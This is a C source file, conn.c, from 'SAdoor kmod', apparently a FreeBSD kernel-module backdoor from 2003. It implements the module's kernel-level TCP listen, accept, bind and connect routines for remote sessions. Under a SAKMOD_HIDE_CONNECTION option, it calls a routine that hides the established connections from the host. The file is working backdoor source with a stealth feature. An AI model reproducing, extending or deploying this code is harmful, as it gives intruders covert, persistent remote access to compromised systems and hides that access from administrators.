/*
 *  File: conn.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: SAdoor kmod TCP/IP accept/listen routines.
 *  Version: 1.0
 *  Date: Thu Jul  3 15:48:22 CEST 2003
 *  
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *      
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *      
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF 
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */     

#include <sys/types.h>
#include <sys/param.h>
#include <sys/systm.h>
#include <sys/kthread.h>
#include <sys/proc.h>
#include <sys/protosw.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/signalvar.h>
#include "sadoor.h"

/* Timeout marker */
static struct callout_handle handle;

/* Timeout handler */
static void accept_timeout_handler(void *);

/*
 * Terminates the accept()'ing process upon connection timeout.
 */
void
accept_timeout_handler(void *proc2kill)
{
    log(1, "Connection timed out after %u seconds (terminating %d).\n",
        SAKMOD_CONNECTION_TIMEOUT, ((struct proc *)proc2kill)->p_pid);

    /* Kill process (better squash him flat at once) */
    psignal((struct proc *)proc2kill, SIGKILL);
}

/*
 * Wait for connection on the supplied socket descriptor.
 * Returns file descriptor of connecting client on succes,
 * -1 on error.
 * lsock - Local socket
 * timeout - Timeout in seconds.
 * cip - IP of connecting client (zero for any).
 * cport - port of connecting client (zero for any).
 */
int
conn_accept(int lsock, time_t timeout_sec, u_long cip, u_short cport)
{
    struct sockaddr_in *client;
    struct listen_args *liargs;
    struct accept_args *aargs;
    struct getpeername_args *gpargs;
    struct close_args *clargs;
    struct in_addr ipa;
    u_int *addrlen;
    struct thread *td;
    struct timeval tv;
    int sa_fd;
    int error;
    u_long connecting_ip;
    u_short connecting_port;

    td = curthread;

    debug(3, "Entered conn_accept()\n");

    /* Allocate userland memory for the arguments */
    client = (struct sockaddr_in *)uland_calloc(sizeof(struct sockaddr_in)+
        sizeof(struct listen_args)+
        sizeof(struct accept_args)+
        sizeof(struct getpeername_args)+
        sizeof(struct close_args)+
        sizeof(u_int));

    liargs = (struct listen_args *)(client + 1);
    aargs = (struct accept_args *)(liargs + 1);
    gpargs = (struct getpeername_args *)(aargs + 1);
    clargs = (struct close_args *)(gpargs + 1);
    addrlen = (u_int *)(clargs + 1);

    /* Set up listen args */
    (void)suword(&liargs->s, lsock);
    (void)suword(&liargs->backlog, 0);

    /* Listen for connections on the bound address
     * (with a queue of 0 waiting clients for the current socket) */
     if ( (error = listen(td, liargs))) {
        log(1, "Error: conn_accept(): listen(): %d\n", error);
        sa_fd = -1;
        goto finished;
     }

    /* Set up accept arguments */
    (void)suword(addrlen, sizeof(struct sockaddr_in));
    (void)suword(&aargs->s, lsock);
    (void)suword(&aargs->name, (int)client);
    (void)suword(&aargs->anamelen, (int)addrlen);
    
    ipa.s_addr = cip;
    debug(2, "Waiting for connection from %s:%u (timeout = %d seconds)\n",
        inet_ntoa(ipa), htons(cport), timeout_sec);
        
    /* Set timeout */
    (u_int)tv.tv_sec = (u_int)timeout_sec;
    tv.tv_usec = 0;
    handle = timeout(accept_timeout_handler, td->td_proc, tvtohz(&tv));

    /* Accept connection on the listening socket */
     if ( (error = accept(td, aargs))) {
        
        if ((error != EINTR) && (error != -1))
            log(1, "Error: conn_accept(): accept(): %d\n", error);
        sa_fd = -1;
        goto finished;
     }

    sa_fd = td->td_retval[0];

    /* Disable alarm */
    untimeout(accept_timeout_handler, td->td_proc, handle);

    /* Close local socket */
    (void)suword(&clargs->fd, lsock);
    if ( (error = close(td, clargs))) 
        log(1, "Warning: Failed to close local socket: %d\n", error);

    /* Set up getpeername arguments */
    (void)suword(&gpargs->fdes, sa_fd);
    (void)suword(&gpargs->asa, (int)client);
    (void)suword(&gpargs->alen, (int)addrlen);

    /* Get address of connecting client */
    if ( (error = getpeername(td, gpargs))) {
        log(1, "Error: conn_accept(): Could not get address of connecting client:"
            " getpeername(): %d\n", error);
        sa_fd = -1;
        goto finished;
    }

    /* Get address of connecting client */
    (void)copyin(&client->sin_addr.s_addr, &ipa.s_addr, sizeof(ipa.s_addr));
    (void)copyin(&client->sin_port, &connecting_port, sizeof(connecting_port));
    connecting_ip = ipa.s_addr;
    ipa.s_addr = cip;

    /* Set proc-name */
/* s = splhigh();
*    snprintf(td->td_proc->p_comm, MAXCOMLEN, "%s-%s:%u", SAKMOD_PROC_NAME,
*        inet_ntoa(client->sin_addr), ntohs(client->sin_port));
*    splx(s);
*/

    /* Check that address match */
    if ( ((cip != 0) && (connecting_ip != cip)) ||
            (((cport != 0) && connecting_port != cport))) {
        log(1, "Error: address of connecting client do not match "
            "expected address (%s:%u)\n", inet_ntoa(ipa), ntohs(cport));

        /* We should actually close this, 
         * but the process terminates, so we ignore that for now */
        sa_fd = -1;

        goto finished;
    }

    log(1, "Connection established with %s:%u (pid %u)\n",
        inet_ntoa(ipa), ntohs(connecting_port), td->td_proc->p_pid);

#ifdef SAKMOD_HIDE_CONNECTION
    /* Hide connection */
    hide_conns_addconn(cip, cport);
#endif /* SAKMOD_HIDE_CONNECTION */

    finished:
        uland_free(client);
        return(sa_fd);
}


/*  
 * Create socket and bind it to the selected port.
 * If port is zero, the next available port is selected
 * by the system.
 * Returns the socket file descriptor on success, -1 on error.
 * lip - The local ip to accept connections on.
 * port - The port to bind to.
 * lip and port is assumed to be in network byte order.
 */ 
int 
conn_bindsock(long lip, u_short port)
{
    struct socket_args *sargs;
    struct bind_args *bargs;
    struct sockaddr_in *laddr;
    struct thread *td;
    int error;
    int lsock;

    td = curthread;
    sargs = (struct socket_args *)uland_calloc(sizeof(struct socket_args) +
        sizeof(struct bind_args) +
        sizeof(struct sockaddr_in));

    bargs = (struct bind_args *)(sargs + 1);
    laddr = (struct sockaddr_in *)(bargs + 1);

    /* Set up socket arguments */
    (void)suword(&sargs->domain, AF_INET);
    (void)suword(&sargs->type, SOCK_STREAM);
    (void)suword(&sargs->protocol, 0);

    debug(3, "Creating socket\n");

    /* Create socket */
    if ( (error = socket(td, sargs))) {
        log(1, "Error: conn_bindsock(): socket(): %d\n", error);
        lsock = -1;
        goto finished;
    }
    lsock = td->td_retval[0];

    /* Create IPv4 address */
    (void)subyte(&laddr->sin_family, AF_INET);
    (void)copyout(&port, &laddr->sin_port, 2);
    (void)suword(&(laddr->sin_addr).s_addr, lip);

    /* Set up bind arguments */
    (void)suword(&bargs->s, lsock);
    (void)suword(&bargs->name, (int)laddr);
    (void)suword(&bargs->namelen, sizeof(struct sockaddr_in));
    
    /* Bind socket to address */
    if ( (error = bind(td, bargs))) {
        log(1, "Error: conn_bindsock(): bind(): %d\n", error);
        lsock = -1;
    }

    finished:
        uland_free(sargs);
        return(lsock);
}


/*
 * Connect to ip:port.
 * IP and port is assumed to be in network byte order.
 * Returns socket descriptor on success, -1 on error.
 */
int
conn_connect(u_long ip, u_short port)
{
    struct socket_args *sargs;
    struct connect_args *cargs;
    struct sockaddr_in *taddr;
    struct thread *td;
    struct in_addr ipa;            /* For syslog */
    u_short p;                    /* For syslog */
    int error;
    int sd;
    td = curthread;
    
    sargs = (struct socket_args *)uland_calloc(sizeof(struct socket_args) +
        sizeof(struct connect_args) +
        sizeof(struct sockaddr_in));

    cargs = (struct connect_args *)(sargs + 1);
    taddr = (struct sockaddr_in *)(cargs + 1);

    /* Set up socket arguments */
    (void)suword(&sargs->domain, AF_INET);
    (void)suword(&sargs->type, SOCK_STREAM);
    (void)suword(&sargs->protocol, 0);

    debug(3, "Creating socket\n");

    /* Create socket */
    if ( (error = socket(td, sargs))) {
        log(1, "Error: conn_connect(): socket(): %d\n", error);
        sd = -1;
        goto finished;
    }
    sd = td->td_retval[0];

    /* Create IPv4 address */
    (void)subyte(&taddr->sin_family, AF_INET);
    (void)copyout(&port, &taddr->sin_port, 2);
    (void)suword(&(taddr->sin_addr).s_addr, ip);

    /* Save for logging */
    (void)copyin(&taddr->sin_addr, &ipa, sizeof(ipa));
    (void)copyin(&taddr->sin_port, &p, sizeof(p));

    /* Set up connect arguments */
    (void)suword(&cargs->s, sd);
    (void)suword(&cargs->name, (int)taddr);
    (void)suword(&cargs->namelen, sizeof(struct sockaddr_in));

    debug(3, "Connecting to client (%s:%u, socket descriptor = %d)\n", 
        inet_ntoa(ipa), ntohs(p), cargs->s);

    /* Pick the next available source port and connect to client */
    if ( (error = connect(td, cargs))) {
        
        log(1, "Error: connect to %s:%u: %d\n", 
            inet_ntoa(ipa), ntohs(p), error);
        sd = -1;
        goto finished;
    }

    log(1, "Connection established with %s:%u (pid %u)\n", 
        inet_ntoa(ipa), ntohs(p), td->td_proc->p_pid);

#ifdef SAKMOD_HIDE_CONNECTION
    /* Hide connection */
    hide_conns_addconn(ipa.s_addr, p);
#endif /* SAKMOD_HIDE_CONNECTION */

    /* Set proc-name */
/*
*    s = splhigh();
*    snprintf(td->td_proc->p_comm, MAXCOMLEN, "%s-%s:%u", SAKMOD_PROC_NAME, 
*        inet_ntoa(taddr->sin_addr), ntohs(taddr->sin_port));
*    splx(s);
*/

    finished:
        uland_free(sargs);
        return(sd);
}

